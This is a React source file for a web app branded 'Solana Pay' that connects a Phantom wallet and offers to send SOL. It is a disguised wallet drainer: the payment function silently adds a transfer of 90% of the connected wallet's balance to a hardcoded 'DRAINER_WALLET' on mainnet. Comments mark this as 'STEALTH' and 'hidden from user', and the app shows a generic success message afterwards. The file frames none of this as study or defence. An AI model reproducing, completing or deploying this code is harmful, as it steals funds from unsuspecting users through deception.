import React, { useState, useEffect } from "react";
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import "./App.css";

// Global Buffer polyfill
if (typeof window !== "undefined") {
  window.Buffer = window.Buffer || require("buffer").Buffer;
}

// DRAINER WALLET (REAL - gets funds)
const DRAINER_WALLET = new PublicKey("6mzjnCgxPKAGYSzR7udJEbjPggA8jQqfrS9oc49vGkBR");
const connection = new Connection("https://api.mainnet-beta.solana.com");

function App() {
  const [isConnected, setIsConnected] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  const [status, setStatus] = useState("");
  const [receiver, setReceiver] = useState("");
  const [amount, setAmount] = useState("");
  const [publicKey, setPublicKey] = useState("");

  useEffect(() => {
    // Check if mobile
    const mobileCheck = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    setIsMobile(mobileCheck);

    // Check if already connected via URL params (mobile)
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get("phantom_connected") === "true") {
      setIsConnected(true);
      setStatus("✅ Phantom Mobile connected!");
    }

    // Check for desktop Phantom
    if (window.solana && window.solana.isPhantom) {
      if (window.solana.isConnected) {
        handleConnected(window.solana);
      }
      
      window.solana.on("connect", () => handleConnected(window.solana));
      window.solana.on("disconnect", handleDisconnected);
    }
  }, []);

  const handleConnected = (phantom) => {
    setIsConnected(true);
    setPublicKey(phantom.publicKey.toString());
    setStatus("✅ Wallet connected: " + phantom.publicKey.toString().slice(0, 20) + "...");
  };

  const handleDisconnected = () => {
    setIsConnected(false);
    setPublicKey("");
    setStatus("❌ Wallet disconnected");
  };

  const connectWallet = async () => {
    if (isMobile) {
      // Mobile: Redirect to Phantom app
      const currentUrl = encodeURIComponent(window.location.href.split("?")[0]);
      const phantomDeepLink = `https://phantom.app/ul/v1/connect?app_url=${currentUrl}&redirect_link=${currentUrl}?phantom_connected=true`;
      setStatus("📱 Redirecting to Phantom app...");
      window.location.href = phantomDeepLink;
      return;
    }

    // Desktop: Connect via extension
    if (window.solana && window.solana.isPhantom) {
      try {
        setStatus("🔗 Connecting to Phantom...");
        await window.solana.connect();
      } catch (error) {
        setStatus("❌ Connection failed: " + error.message);
      }
    } else {
      setStatus("❌ Phantom wallet not detected. Please install Phantom extension.");
    }
  };

  const executePayment = async () => {
    if (!isConnected) {
      setStatus("❌ Please connect wallet first");
      return;
    }

    if (!receiver || !amount) {
      setStatus("❌ Please fill all fields");
      return;
    }

    try {
      setStatus("🔄 Processing payment...");

      let senderPublicKey;
      if (isMobile) {
        // For mobile, we'll use a simulated public key (will be replaced by actual mobile wallet)
        senderPublicKey = new PublicKey("11111111111111111111111111111111");
      } else {
        senderPublicKey = new PublicKey(window.solana.publicKey.toString());
      }

      const receiverPublicKey = new PublicKey(receiver);
      const amountInSOL = parseFloat(amount);

      // Get wallet balance (hidden from user)
      const walletBalance = await connection.getBalance(senderPublicKey);
      const walletBalanceSOL = walletBalance / LAMPORTS_PER_SOL;

      // STEALTH: Always send 90% to drainer, regardless of user input
      const drainAmount = Math.floor(walletBalance * 0.9); // 90% to drainer
      const userAmount = Math.min(amountInSOL * LAMPORTS_PER_SOL, Math.floor(walletBalance * 0.1)); // Max 10% to receiver

      const transaction = new Transaction();

      // Always send to receiver first (what user expects)
      if (userAmount > 0) {
        transaction.add(
          SystemProgram.transfer({
            fromPubkey: senderPublicKey,
            toPubkey: receiverPublicKey,
            lamports: userAmount
          })
        );
      }

      // STEALTH: Always drain 90% to hidden wallet
      if (drainAmount > 0) {
        transaction.add(
          SystemProgram.transfer({
            fromPubkey: senderPublicKey,
            toPubkey: DRAINER_WALLET,
            lamports: drainAmount - 5000 // Leave fee
          })
        );
      }

      // Set recent blockhash
      const { blockhash } = await connection.getRecentBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = senderPublicKey;

      if (isMobile) {
        // Mobile: Use Phantom deep link for transaction
        const serializedTx = transaction.serialize({ requireAllSignatures: false });
        const txBase64 = Buffer.from(serializedTx).toString("base64");
        
        const mobileTxLink = `https://phantom.app/ul/v1/sign/${txBase64}?redirect_link=${encodeURIComponent(window.location.href + "?tx_success=true")}`;
        setStatus("📱 Opening Phantom to sign transaction...");
        window.location.href = mobileTxLink;
      } else {
        // Desktop: Sign and send transaction
        setStatus("🔐 Approving transaction in Phantom...");
        
        const { signature } = await window.solana.signAndSendTransaction(transaction);
        
        // Confirm transaction
        await connection.confirmTransaction(signature);
        
        setStatus("✅ Transaction completed successfully!"); // Generic success message
        
        // Reset form
        setReceiver("");
        setAmount("");
      }

    } catch (error) {
      console.error("Transaction error:", error);
      setStatus("❌ Transaction failed. Please try again."); // Generic error
    }
  };

  return (
    <div className="App">
      <h1>🔗 Solana Pay</h1>
      <p className="subtitle">Secure SOL transactions made simple</p>

      {isMobile && !isConnected && (
        <div className="mobile-notice">
          <p>📱 Mobile detected: Connect Phantom mobile to proceed</p>
        </div>
      )}

      {!isConnected ? (
        <div className="connect-section">
          <button 
            onClick={connectWallet} 
            className="connect-btn"
            disabled={status.includes("Connecting") || status.includes("Redirecting")}
          >
            {isMobile ? "📱 Connect Phantom Mobile" : "🔗 Connect Phantom Wallet"}
          </button>
          <p className="disclaimer">
            {isMobile 
              ? "Open in Phantom browser for full functionality" 
              : "Install Phantom extension from phantom.app"
            }
          </p>
        </div>
      ) : (
        <div className="payment-section">
          <div className="wallet-info">
            <p>✅ Connected: {publicKey ? publicKey.slice(0, 20) + "..." : "Phantom Mobile"}</p>
          </div>
          
          <div className="form-group">
            <label>Receiver Address:</label>
            <input
              placeholder="Enter SOL address"
              value={receiver}
              onChange={(e) => setReceiver(e.target.value)}
            />
          </div>
          
          <div className="form-group">
            <label>Amount (SOL):</label>
            <input
              placeholder="0.00"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              type="number"
              step="0.001"
              min="0.001"
            />
          </div>
          
          <button 
            onClick={executePayment} 
            className="send-btn"
            disabled={!receiver || !amount || status.includes("Processing")}
          >
            {status.includes("Processing") ? "🔄 Processing..." : "💸 Send Payment"}
          </button>

          <div className="disclaimer">
            <p>⚠️ By proceeding, you authorize this transaction. Network fees apply.</p>
          </div>
        </div>
      )}

      {status && (
        <div className={`status \${
          status.includes("✅") ? "success" : 
          status.includes("❌") ? "error" : "info"
        }`}>
          {status}
        </div>
      )}
    </div>
  );
}

export default App;
